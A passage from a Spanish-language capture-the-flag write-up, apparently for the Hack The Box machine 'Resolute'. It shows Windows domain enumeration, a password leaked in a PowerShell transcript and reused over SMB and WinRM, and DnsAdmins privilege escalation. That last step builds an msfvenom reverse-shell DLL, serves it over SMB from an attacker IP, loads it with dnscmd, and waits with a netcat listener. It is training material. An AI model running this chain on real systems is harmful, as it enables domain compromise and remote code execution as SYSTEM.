+<h2 id="shell-as-ryan">Shell as Ryan</h2>
+
+<ul>
+  <li>No tenemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<ul>
+  <li>Estos como ya sabemos son los usuarios del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; net user /domain
+
+User accounts <span class="k">for</span> <span class="se">\\</span>
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+abigail                  Administrator            angela
+annette                  annika                   claire
+claude                   DefaultAccount           felicia
+fred                     Guest                    gustavo
+krbtgt                   marcus                   marko
+melanie                  naoki                    paulo
+per                      ryan                     sally
+simon                    steve                    stevie
+sunita                   ulf                      zach
+The <span class="nb">command </span>completed with one or more errors.
+</code></pre></div></div>
+
+<ul>
+  <li>Pero si vamos a la carpeta <code class="language-plaintext highlighter-rouge">C:\Users\</code> que hay otro usuario llamado <strong>ryan</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        9/25/2019  10:43 AM                Administrator
+d-----        12/4/2019   2:46 AM                melanie
+d-r---       11/20/2016   6:39 PM                Public
+d-----        9/27/2019   7:05 AM                ryan
+</code></pre></div></div>
+
+<ul>
+  <li>De primeras no hay nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\</span>
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files <span class="o">(</span>x86<span class="o">)</span>
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+</code></pre></div></div>
+
+<ul>
+  <li>En <code class="language-plaintext highlighter-rouge">Powershell</code> el comando <code class="language-plaintext highlighter-rouge">dir -force</code> es similar al <code class="language-plaintext highlighter-rouge">ls -la</code> en <strong>Linux</strong> con esto podemos ver archivos ocultos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir</span> <span class="nt">-force</span>
+
+
+    Directory: C:<span class="se">\</span>
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d--hs-        12/3/2019   6:40 AM                <span class="nv">$RECYCLE</span>.BIN
+d--hsl        9/25/2019  10:17 AM                Documents and Settings
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files <span class="o">(</span>x86<span class="o">)</span>
+d--h--        9/25/2019  10:48 AM                ProgramData
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+d--hs-        9/25/2019  10:17 AM                Recovery
+d--hs-        9/25/2019   6:25 AM                System Volume Information
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+<span class="nt">-arhs-</span>       11/20/2016   5:59 PM         389408 bootmgr
+<span class="nt">-a-hs-</span>        7/16/2016   6:10 AM              1 BOOTNXT
+<span class="nt">-a-hs-</span>        3/28/2024   1:43 PM      402653184 pagefile.sys
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ver que es lo que contiene la carpeta <strong>PSTranscripts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts&gt; <span class="nb">dir</span> <span class="nt">-force</span>
+
+
+    Directory: C:<span class="se">\P</span>STranscripts
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d--h--        12/3/2019   6:45 AM                20191203
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt; <span class="nb">dir</span> <span class="nt">-force</span>
+
+
+    Directory: C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-arh--</span>        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Encontramos una contraseña en el <strong>.txt</strong> que encontramos del usuario <code class="language-plaintext highlighter-rouge">ryan:Serv3r4Admin4cc123!</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt; <span class="nb">type </span>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+<span class="k">**********************</span>
+Windows PowerShell transcript start
+Start <span class="nb">time</span>: 20191203063201
+Username: MEGABANK<span class="se">\r</span>yan
+RunAs User: MEGABANK<span class="se">\r</span>yan
+Machine: RESOLUTE <span class="o">(</span>Microsoft Windows NT 10.0.14393.0<span class="o">)</span>
+Host Application: C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>smprovhost.exe <span class="nt">-Embedding</span>
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+<span class="k">**********************</span>
+Command start <span class="nb">time</span>: 20191203063455
+<span class="k">**********************</span>
+PS&gt;TerminatingError<span class="o">()</span>: <span class="s2">"System error."</span>
+<span class="o">&gt;&gt;</span> CommandInvocation<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="s2">"Invoke-Expression"</span>
+<span class="o">&gt;&gt;</span> ParameterBinding<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="nv">name</span><span class="o">=</span><span class="s2">"Command"</span><span class="p">;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"-join(</span><span class="nv">$id</span><span class="s2">,'PS ',</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">,'@',</span><span class="nv">$env</span><span class="s2">:computername,' ',</span><span class="k">$((</span>gi <span class="nv">$pwd</span><span class="o">)</span>.Name<span class="o">)</span>,<span class="s1">'&gt; '</span><span class="o">)</span>
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
+&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
+**********************
+Command start time: 20191203063455
+**********************
+PS&gt;ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>PS megabank<span class="se">\r</span>yan@RESOLUTE Documents&gt; <span class="s2">"
+PS megabank</span><span class="se">\r</span><span class="s2">yan@RESOLUTE Documents&gt;
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Invoke-Expression): "</span>Invoke-Expression<span class="s2">"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="</span>Command<span class="s2">"; value="</span>cmd <span class="o">/</span>c net use X: <span class="se">\\</span>fs01<span class="se">\b</span>ackups ryan Serv3r4Admin4cc123!
+
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
+&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>The syntax of this <span class="nb">command </span>is:<span class="s2">"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+*Evil-WinRM* PS C:</span><span class="se">\P</span><span class="s2">STranscripts</span><span class="se">\2</span><span class="s2">0191203&gt;
+</span></code></pre></div></div>
+
+<ul>
+  <li>Lo que podemos hacer es probar las credenciales y ver los recursos compartidos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123!
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\r</span>yan:Serv3r4Admin4cc123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+➜  content crackmapexec smb 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123! <span class="nt">--shares</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:RESOLUTE<span class="o">)</span> <span class="o">(</span>domain:megabank.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] megabank.local<span class="se">\r</span>yan:Serv3r4Admin4cc123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.96.155   445    RESOLUTE         <span class="o">[</span>+] Enumerated shares
+SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
+SMB         10.129.96.155   445    RESOLUTE         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.96.155   445    RESOLUTE         ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.96.155   445    RESOLUTE         C<span class="nv">$ </span>                             Default share
+SMB         10.129.96.155   445    RESOLUTE         IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
+SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ya nos devuelve un <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> lo que significa que podemos conectar usando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.155 <span class="nt">-u</span> ryan <span class="nt">-p</span> Serv3r4Admin4cc123!
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+
+<ul>
+  <li>
+    <p>Pues bueno el único usuario que nos queda es el usuario <strong>Administrator</strong>.</p>
+  </li>
+  <li>
+    <p>En el escritorio nos dejaron una nota.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        12/3/2019   7:34 AM            155 note.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">type </span>note.txt
+Email to team:
+
+- due to change freeze, any system changes <span class="o">(</span>apart from those to the administrator account<span class="o">)</span> will be automatically reverted within 1 minute
+</code></pre></div></div>
+
+<ul>
+  <li>Nos dicen lo siguiente <strong>cualquier modificación realizada en el sistema, excepto aquellas relacionadas con la cuenta de administrador, será revertida automáticamente en un plazo de 1 minuto</strong>.</li>
+</ul>
+
+<blockquote>
+  <p>Una “change freeze” es una medida tomada por una organización para evitar realizar cambios significativos en sus sistemas, especialmente durante ciertos períodos críticos, como durante la implementación de actualizaciones importantes, períodos de alta actividad comercial o durante auditorías. Durante un “change freeze”, se pueden establecer políticas que limiten o prohíban ciertos tipos de cambios en los sistemas, con el objetivo de mantener la estabilidad y evitar posibles interrupciones o problemas operativos.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Pero bueno sabemos que aunque se haya impuesto un <code class="language-plaintext highlighter-rouge">"change freeze"</code> se permite realizar cambios en la cuenta del administrador.</p>
+  </li>
+  <li>
+    <p>Vemos que formamos parte del grupo <code class="language-plaintext highlighter-rouge">DnsAdmins</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name     SID
+<span class="o">=============</span> <span class="o">==============================================</span>
+megabank<span class="se">\r</span>yan S-1-5-21-1392959593-3013219662-3596683436-1105
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                 Type             SID                                            Attributes
+<span class="o">==========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK<span class="se">\C</span>ontractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK<span class="se">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\M</span>edium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+
+
+USER CLAIMS INFORMATION
+<span class="nt">-----------------------</span>
+
+User claims unknown.
+
+Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
+</code></pre></div></div>
+
+<blockquote>
+  <p>El grupo “DnsAdmins” es un grupo de seguridad en los sistemas operativos Windows que tiene privilegios especiales para administrar y realizar cambios en el servicio de DNS (Domain Name System). Este grupo se utiliza específicamente para delegar ciertos privilegios de administración sobre la infraestructura de DNS a usuarios o administradores específicos en un entorno de red.</p>
+</blockquote>
+
+<ul>
+  <li>Como tal nosotros formamos parte del Grupo <strong>Contractors</strong> y ese grupo forma parte del grupo <strong>DnsAdmins</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; net localgroup DnsAdmins
+Alias name     DnsAdmins
+Comment        DNS Administrators Group
+
+Members
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Contractors
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Lo que vamos a hacer es crear un <code class="language-plaintext highlighter-rouge">dll</code> malicioso para que cargue una <code class="language-plaintext highlighter-rouge">ddl</code> maliciosa cuando se inicie el servicio y cuando lo arranque obtener una reverse shell privilegiada <a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/">https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">dnscmd</code> para que en el arranque del servicio <code class="language-plaintext highlighter-rouge">dns</code> carge nuestro <code class="language-plaintext highlighter-rouge">ddl</code> malicioso que crearemos con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.222 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> dll <span class="nt">-o</span> zi.dll
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: zi.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">smbserver</code> para compartir el recurso por <strong>smb</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a pasarlo tal como nos dicen en el recurso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; dnscmd.exe /config /serverlevelplugindll <span class="se">\\</span>10.10.14.222<span class="se">\s</span>mbFolder<span class="se">\z</span>i.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Nos vamos a poner en escucha para que cuando arranquemos el servicio nos llegue la reverse shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a parar el servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; sc.exe stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                <span class="o">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span class="o">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo iniciamos para que se realice la autenticación y cargue el <code class="language-plaintext highlighter-rouge">dll</code> malicioso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; sc.exe
+start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3132
+        FLAGS              :
+</code></pre></div></div>
+
+<h2 id="roottxt">root.txt</h2>
+
+<ul>
+  <li>Recibimos la shell. (En caso de que no te funcione para e inicia el servicio varias veces o también vuelve a ejecutar el <code class="language-plaintext highlighter-rouge">dnscmd.exe</code>).</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.155,52274<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>MEGABANK<span class="se">\R</span>ESOLUTE<span class="nv">$,</span>RESOLUTE<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User RESOLUTE<span class="se">\R</span>ESOLUTE<span class="nv">$ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> RESOLUTE<span class="nv">$:</span>:MEGABANK:aaaaaaaaaaaaaaaa:5fd11fc9f6cc3724acfde84f043b1d72:01010000000000008046e3536381da0167b141b477c8e25f00000000010010007100530072006e004c00520077007600030010007100530072006e004c00520077007600020010007500480075005a006c00420043004e00040010007500480075005a006c00420043004e00070008008046e3536381da0106000400020000000800300030000000000000000000000000400000ddc6f9f12cfdc0fd4d7049096a7d95a949c54ef52ba4f03393f0195cbfabcacb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200320032000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
